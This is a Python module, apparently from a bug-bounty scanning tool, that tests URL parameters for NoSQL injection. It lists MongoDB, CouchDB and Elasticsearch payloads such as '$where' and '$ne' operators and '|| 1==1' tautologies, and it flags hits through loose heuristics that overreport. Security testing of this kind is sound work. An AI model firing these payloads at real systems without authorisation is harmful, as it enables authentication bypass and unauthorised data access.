"""NoSQL Injection scanner for BugBountyCrawler."""

import re
import asyncio
import json
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType


class NoSQLInjectionScanner(BaseScanner):
    """Scanner for NoSQL injection vulnerabilities."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize NoSQL injection scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "NoSQLInjectionScanner"
        
        # MongoDB injection payloads
        self.mongodb_payloads = [
            "' || '1'=='1",
            "' || 1==1//",
            "' || 1==1%00",
            "admin' || 'a'=='a",
            "'; return true; var foo='",
            "'; return 1; var foo='",
            "'; return true; //",
            "'; return 1; //",
            {'$gt': ''},
            {'$ne': ''},
            {'$where': 'return true'},
            {'$where': '1==1'},
            {'$or': [{'a': 1}, {'a': 2}]},
            {'$and': [{'a': 1}, {'a': 1}]},
            {'$regex': '.*'},
            {'$exists': True},
        ]
        
        # CouchDB injection payloads
        self.couchdb_payloads = [
            "' || 'a'=='a",
            "' || true || '",
            "'; return true; var x='",
            {'selector': {'$or': [{'_id': {'$gt': None}}, {'_id': {'$lt': None}}]}},
            {'selector': {'_id': {'$gt': None}}},
            {'selector': {'$and': [{'_id': {'$gt': None}}]}},
        ]
        
        # ElasticSearch injection payloads
        self.elasticsearch_payloads = [
            {'query': {'match_all': {}}},
            {'query': {'bool': {'must': [{'match_all': {}}]}}},
            {'query': {'wildcard': {'*': '*'}}},
        ]
        
        # NoSQL error patterns
        self.error_patterns = [
            r'MongoError',
            r'MongoDB',
            r'CouchDB',
            r'Elastic',
            r'neo4j',
            r'redis',
            r'cassandra',
            r'\$where',
            r'\$gt',
            r'\$ne',
            r'\$regex',
            r'\$exists',
            r'\$or',
            r'\$and',
            r'SyntaxError.*JSON',
            r'Unexpected token',
            r'Invalid JSON',
            r'BSON',
            r'ObjectId',
            r'ISODate',
            r'NumberLong',
            r'Timestamp',
        ]
        
        # Success indicators
        self.success_indicators = [
            r'"success":\s*true',
            r'"status":\s*200',
            r'"data":\s*\[',
            r'"results":\s*\[',
            r'"documents":\s*\[',
            r'"items":\s*\[',
            r'"records":\s*\[',
            r'"total":\s*\d+',
            r'"count":\s*\d+',
        ]
    
    async def scan_url(self, url: str) -> ScanResult:
        """Scan URL for NoSQL injection vulnerabilities."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Make baseline request
            baseline_response = await self.make_request(url)
            response_time = baseline_response.headers.get("X-Response-Time", 0.0)
            status_code = baseline_response.status
            headers = dict(baseline_response.headers)
            content_length = int(baseline_response.headers.get("Content-Length", 0))
            
            baseline_content = await baseline_response.text()
            
            # Parse URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                return ScanResult(
                    url=url,
                    findings=findings,
                    errors=errors,
                    response_time=response_time,
                    status_code=status_code,
                    headers=headers,
                    content_length=content_length
                )
            
            # Test each parameter
            for param_name, param_values in query_params.items():
                if param_values:
                    original_value = param_values[0]
                    
                    # Test MongoDB injection
                    mongo_findings = await self._test_mongodb_injection(
                        url, param_name, original_value, baseline_content
                    )
                    findings.extend(mongo_findings)
                    
                    # Test CouchDB injection
                    couch_findings = await self._test_couchdb_injection(
                        url, param_name, original_value, baseline_content
                    )
                    findings.extend(couch_findings)
                    
                    # Test ElasticSearch injection
                    elastic_findings = await self._test_elasticsearch_injection(
                        url, param_name, original_value, baseline_content
                    )
                    findings.extend(elastic_findings)
        
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    async def _test_mongodb_injection(self, url: str, param_name: str, 
                                     original_value: str, baseline_content: str) -> List[Finding]:
        """Test for MongoDB injection."""
        findings = []
        
        for payload in self.mongodb_payloads[:10]:
            try:
                if isinstance(payload, dict):
                    # JSON payload
                    test_url = self._create_json_test_url(url, param_name, payload)
                else:
                    # String payload
                    test_url = self._create_test_url(url, param_name, payload)
                
                response = await self.make_request(test_url)
                content = await response.text()
                
                # Check for error patterns
                for pattern in self.error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.NOSQL_INJECTION,
                            title=f"MongoDB NoSQL Injection (Parameter: {param_name})",
                            description=f"NoSQL injection detected in parameter '{param_name}' using MongoDB payload: {payload}",
                            severity=FindingSeverity.CRITICAL,
                            impact="NoSQL injection can lead to unauthorized data access, data manipulation, and authentication bypass",
                            likelihood="high",
                            risk_score=9.0,
                            references=[
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                                "https://cwe.mitre.org/data/definitions/943.html"
                            ],
                            raw_data={
                                "parameter": param_name,
                                "payload": str(payload),
                                "error_pattern": pattern,
                                "response_content": content[:500],
                                "database_type": "mongodb"
                            }
                        )
                        findings.append(finding)
                        return findings
                
                # Check for successful injection
                if self._is_injection_successful(content, baseline_content):
                    finding = self.create_finding(
                        url=url,
                        finding_type=FindingType.NOSQL_INJECTION,
                        title=f"MongoDB NoSQL Injection - Boolean Based (Parameter: {param_name})",
                        description=f"Boolean-based NoSQL injection detected in parameter '{param_name}'",
                        severity=FindingSeverity.CRITICAL,
                        impact="NoSQL injection allows unauthorized data access and authentication bypass",
                        likelihood="high",
                        risk_score=9.0,
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
                        ],
                        raw_data={
                            "parameter": param_name,
                            "payload": str(payload),
                            "response_content": content[:500],
                            "database_type": "mongodb",
                            "injection_type": "boolean_based"
                        }
                    )
                    findings.append(finding)
                    return findings
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    async def _test_couchdb_injection(self, url: str, param_name: str, 
                                     original_value: str, baseline_content: str) -> List[Finding]:
        """Test for CouchDB injection."""
        findings = []
        
        for payload in self.couchdb_payloads[:5]:
            try:
                if isinstance(payload, dict):
                    test_url = self._create_json_test_url(url, param_name, payload)
                else:
                    test_url = self._create_test_url(url, param_name, payload)
                
                response = await self.make_request(test_url)
                content = await response.text()
                
                if 'CouchDB' in content or 'selector' in content:
                    finding = self.create_finding(
                        url=url,
                        finding_type=FindingType.NOSQL_INJECTION,
                        title=f"CouchDB NoSQL Injection (Parameter: {param_name})",
                        description=f"CouchDB injection detected in parameter '{param_name}'",
                        severity=FindingSeverity.CRITICAL,
                        impact="NoSQL injection can lead to unauthorized data access",
                        likelihood="high",
                        risk_score=9.0,
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
                        ],
                        raw_data={
                            "parameter": param_name,
                            "payload": str(payload),
                            "response_content": content[:500],
                            "database_type": "couchdb"
                        }
                    )
                    findings.append(finding)
                    return findings
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    async def _test_elasticsearch_injection(self, url: str, param_name: str, 
                                           original_value: str, baseline_content: str) -> List[Finding]:
        """Test for ElasticSearch injection."""
        findings = []
        
        for payload in self.elasticsearch_payloads[:3]:
            try:
                test_url = self._create_json_test_url(url, param_name, payload)
                
                response = await self.make_request(test_url)
                content = await response.text()
                
                if 'elastic' in content.lower() or 'hits' in content:
                    finding = self.create_finding(
                        url=url,
                        finding_type=FindingType.NOSQL_INJECTION,
                        title=f"ElasticSearch NoSQL Injection (Parameter: {param_name})",
                        description=f"ElasticSearch injection detected in parameter '{param_name}'",
                        severity=FindingSeverity.HIGH,
                        impact="ElasticSearch injection can lead to unauthorized data access",
                        likelihood="medium",
                        risk_score=8.0,
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
                        ],
                        raw_data={
                            "parameter": param_name,
                            "payload": str(payload),
                            "response_content": content[:500],
                            "database_type": "elasticsearch"
                        }
                    )
                    findings.append(finding)
                    return findings
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    def _is_injection_successful(self, content: str, baseline_content: str) -> bool:
        """Check if injection was successful."""
        # Check for success indicators
        for indicator in self.success_indicators:
            if re.search(indicator, content, re.IGNORECASE):
                if indicator not in baseline_content:
                    return True
        
        # Check for significantly different response
        if abs(len(content) - len(baseline_content)) > 100:
            return True
        
        return False
    
    def _create_test_url(self, url: str, param_name: str, payload: str) -> str:
        """Create test URL with NoSQL injection payload."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        query_params[param_name] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if new_query:
            new_url += f"?{new_query}"
        
        return new_url
    
    def _create_json_test_url(self, url: str, param_name: str, payload: Dict) -> str:
        """Create test URL with JSON NoSQL injection payload."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Convert dict payload to JSON string
        query_params[param_name] = [json.dumps(payload)]
        
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if new_query:
            new_url += f"?{new_query}"
        
        return new_url

